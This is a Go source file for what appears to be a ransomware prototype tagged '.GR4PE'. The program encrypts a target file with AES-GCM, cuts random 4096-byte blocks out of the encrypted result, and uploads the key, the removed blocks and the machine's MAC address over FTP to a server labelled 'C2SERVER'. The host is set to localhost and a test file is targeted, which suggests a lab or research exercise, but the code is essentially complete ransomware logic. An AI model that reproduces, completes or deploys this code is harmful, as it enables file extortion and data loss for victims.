package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"math/big"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"

	"github.com/jlaffaye/ftp"
)

type Header struct {
	signiture []byte //.GR4PE
	filename  []byte //FILENAME
}

type uploadData struct {
	signiture []byte     //.GR4PE
	filename  []byte     //FILENAME
	mac       []byte     //MAC.0xFFFFFFFFFFFF
	Data      []DataByte //IDXn.0xFFFFFFFFFFFF
	key       []byte     //key
}

type Data struct {
	idx  uint64 //IDXn.0xFFFFFFFFFFFF
	data []byte //data
}

type DataByte struct {
	idx  []byte //IDXn.0xFFFFFFFFFFFF
	data []byte //data
}

func check(e error) {
	if e != nil && e != io.EOF {
		panic(e)
	}
}

func filenameHash(data string) string {
	return hex.EncodeToString(md5.New().Sum([]byte(data)))
}

func stripStruct(s interface{}) string {
	return strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(fmt.Sprintf("%s", s), "{", ""), "}", ""), " ", ""), "[", ""), "]", "")
}

func randRange(min, max, cnt int64) []uint64 {
	var ret []uint64
	for i := int64(0); i < cnt; i++ {
		n, err := rand.Int(rand.Reader, big.NewInt(max-min))
		check(err)
		for j := 0; j < len(ret); j++ {
			if ret[j]-uint64(n.Int64()+min) < 4096 {
				n, err = rand.Int(rand.Reader, big.NewInt(max-min))
				check(err)
				j = 0
			}
		}
		ret = append(ret, uint64(n.Int64()+min))
	}
	return ret
}

func genEncryptionKey() *[32]byte {
	key := [32]byte{}
	_, err := io.ReadFull(rand.Reader, key[:])
	check(err)
	return &key
}

func encrypt(data []byte, key *[32]byte) (cipherText []byte, err error) {
	block, err := aes.NewCipher(key[:])
	check(err)

	gcm, err := cipher.NewGCM(block)
	check(err)

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	check(err)

	return gcm.Seal(nonce, nonce, data, nil), nil
}

func decrypt(data []byte, key *[32]byte) (plainText []byte, err error) {
	block, err := aes.NewCipher(key[:])
	check(err)

	gcm, err := cipher.NewGCM(block)
	check(err)

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("len(data) < nonceSize")
	}

	nonce, cipherText := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, cipherText, nil)
}

func encryptFile(filename string, key *[32]byte) {
	BUFER_SIZE := int64(4096)
	rfile, err := os.Open(filename)
	check(err)
	defer rfile.Close()
	wfile, err := os.OpenFile(filename+".GR4PE", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	check(err)
	defer wfile.Close()
	fileInfo, err := rfile.Stat()
	check(err)
	for i := int64(0); i < fileInfo.Size()/BUFER_SIZE; i++ {
		buf := make([]byte, BUFER_SIZE)
		_, err = rfile.Read(buf)
		check(err)
		cipherText, err := encrypt(buf, key)
		check(err)
		_, err = wfile.Write(cipherText)
		check(err)
	}
	buf := make([]byte, fileInfo.Size()%BUFER_SIZE)
	_, err = rfile.Read(buf)
	check(err)
	cipherText, err := encrypt(buf, key)
	check(err)
	_, err = wfile.Write(cipherText)
	check(err)
}

func decryptFile(filename string, key *[32]byte) {
	BUFER_SIZE := int64(4124)
	rfile, err := os.Open(filename)
	check(err)
	defer rfile.Close()
	wfile, err := os.Create(filename + ".dec")
	check(err)
	defer wfile.Close()
	fileInfo, err := rfile.Stat()
	check(err)
	for i := int64(0); i < fileInfo.Size()/BUFER_SIZE; i++ {
		buf := make([]byte, BUFER_SIZE)
		_, err = rfile.Read(buf)
		check(err)
		plainText, err := decrypt(buf, key)
		check(err)

		_, err = wfile.Write(plainText)
		check(err)
	}
	buf := make([]byte, fileInfo.Size()%BUFER_SIZE)
	_, err = rfile.Read(buf)
	check(err)
	plainText, err := decrypt(buf, key)
	check(err)
	_, err = wfile.Write(plainText)
	check(err)

}

func readByte(filename string, offset int64, length int64) ([]byte, error) {
	file, err := os.Open(filename)
	check(err)
	defer file.Close()
	fileInfo, err := file.Stat()
	check(err)
	if length == -1 {
		length = fileInfo.Size() - offset
	}
	if offset+length > fileInfo.Size() {
		return nil, fmt.Errorf("offset+length > fileInfo.Size()")
	}
	_, err = file.Seek(offset, 0)
	check(err)
	buf := make([]byte, length)
	_, err = file.Read(buf)
	check(err)
	return buf, nil
}

func readNwriteBuf(wfile *os.File, rfile *os.File, buf []byte) {
	_, err := rfile.Read(buf)
	check(err)

	_, err = wfile.Write(buf)
	check(err)
}

func removeByte(filename string, offset int64, length int64, idx int64) (string, error) {
	BUFER_SIZE := int64(4096)
	ret, err := readByte(filename, offset, length)
	check(err)
	rfile, err := os.Open(filename)
	check(err)
	fileInfo, err := rfile.Stat()
	fileSize := fileInfo.Size()
	fmt.Println(fileSize)
	check(err)
	wfile, err := os.Create(filename + ".tmp")
	check(err)
	defer rfile.Close()
	defer wfile.Close()
	for i := int64(0); i < (offset / BUFER_SIZE); i++ {
		buf := make([]byte, BUFER_SIZE)
		readNwriteBuf(wfile, rfile, buf)
	}
	buf := make([]byte, offset%BUFER_SIZE)
	readNwriteBuf(wfile, rfile, buf)
	wfile.Write([]byte(idxToString(idx, uint64(offset))))
	_, err = rfile.Seek(length, 1)
	fileSize -= length
	check(err)
	fmt.Println("fileSize: ", fileSize)
	fmt.Println("offset: ", offset)
	fmt.Println("fileSize-offset: ", fileSize-offset)
	for i := int64(0); i < ((fileSize - offset) / BUFER_SIZE); i++ {
		buf = make([]byte, BUFER_SIZE)
		readNwriteBuf(wfile, rfile, buf)
	}
	fmt.Println("fileSize-offset%BUFER_SIZE: ", (fileSize-offset)%BUFER_SIZE)
	buf = make([]byte, (fileSize-offset)%BUFER_SIZE)
	readNwriteBuf(wfile, rfile, buf)
	os.Remove(filename)
	os.Rename(filename+".tmp", filename)
	return string(ret), nil
}

// data to string
func idxToString(idx int64, loc uint64) string {
	var data []byte
	data = append(data, []byte(
		"IDX"+strconv.Itoa(int(idx))+string(
			[]byte(".0x"+
				strings.Repeat("0", (12-len(strconv.FormatUint(loc, 16))))+
				strconv.FormatUint(loc, 16))))...,
	)
	return string(data)
}

func genUploadHeader(filename []byte, deletedData []Data, key *[32]byte) uploadData {
	databyte := make([]DataByte, len(deletedData))
	for i := 0; i < len(deletedData); i++ {
		databyte[i] = DataByte{
			idx:  append([]byte(idxToString(int64(i), deletedData[i].idx)), []byte("...")...),
			data: deletedData[i].data,
		}
	}
	return uploadData{
		[]byte(".GR4PE"),
		filename,
		append(
			[]byte("MAC."),
			[]byte(strings.ReplaceAll(getMacAddr(), ":", ""))...,
		),
		databyte,
		[]byte(fmt.Sprintf("...%x...", key)),
	}
	// return uploadData{
	// 	[]byte(".GR4PE"),
	// 	filename,
	// 	append(
	// 		[]byte("MAC."),
	// 		[]byte(strings.ReplaceAll(getMacAddr(), ":", ""))...,
	// 	),
	// 	deletedData,
	// 	key[:],
	// }
}

func putHeader(header Header) {
	wfile, err := os.Create(string(header.filename) + ".GR4PE")
	check(err)
	defer wfile.Close()
	_, err = wfile.Write(header.signiture)
	check(err)
	_, err = wfile.Write(append(header.filename, []byte("...")...))
	check(err)
}

func carveData(filename string) []Data {
	BUFER_SIZE := int64(4096)
	rfile, err := os.Open(filename)
	check(err)
	defer rfile.Close()
	fileInfo, err := rfile.Stat()
	check(err)
	carveCount := fileInfo.Size() / (BUFER_SIZE * 20)
	//carveCount := int64(1)
	fmt.Println(carveCount)
	carveIdx := make([]uint64, carveCount)
	carveDatas := make([]Data, carveCount)
	randlist := randRange(0, fileInfo.Size()-(4096*carveCount), carveCount)
	sort.Slice(randlist, func(i, j int) bool { return randlist[i] < randlist[j] })
	fmt.Println(randlist)
	for i := int64(0); i < carveCount; i++ {
		carveIdx[i] = randlist[i]
		buf, _ := removeByte(filename, int64(carveIdx[i]), 4096, i)
		check(err)
		carveDatas[i] = Data{
			idx:  carveIdx[i],
			data: []byte(buf),
		}
	}
	return carveDatas
}

func getMacAddr() string {
	interfaces, err := net.Interfaces()
	check(err)
	for _, inter := range interfaces {
		if inter.Name == "eth0" {
			return inter.HardwareAddr.String()
		} else if inter.Name == "en0" {
			return inter.HardwareAddr.String()
		} else if inter.Name == "en1" {
			return inter.HardwareAddr.String()
		} else if inter.Name == "wlan0" {
			return inter.HardwareAddr.String()
		} else if inter.Name == "wlp3s0" {
			return inter.HardwareAddr.String()
		} else if inter.Name == "wlan1" {
			return inter.HardwareAddr.String()
		}
	}
	return ""
}

func ftpUpload(filename string, data []byte) (int, error) {
	C2SERVER := "localhost:9021"
	USERNAME := "anonymous"
	PASSWORD := "anonymous"

	uploader, err := ftp.Dial(C2SERVER)
	check(err)
	err = uploader.Login(USERNAME, PASSWORD)
	check(err)
	uid := strings.Replace(getMacAddr(), ":", "", -1)
	_ = uploader.MakeDir(uid)
	err = uploader.ChangeDir(uid)
	check(err)
	err = uploader.Stor(filename, strings.NewReader(string(data)))
	check(err)
	return 1, nil
}

func encryptAndUpload(filename string) {
	key := genEncryptionKey()
	putHeader(
		Header{
			[]byte(".GR4PE"),
			[]byte(filename),
		},
	)
	encryptFile(filename, key)
	carveData(filename + ".GR4PE")
	uploadHeader := genUploadHeader(
		[]byte(filename),
		carveData(filename+".GR4PE"),
		key,
	)
	ftpUpload(filenameHash(filename), []byte(stripStruct(fmt.Sprintf("%s", uploadHeader))))
}

func main() {
	encryptAndUpload("tmpfile/in/test copy")
}
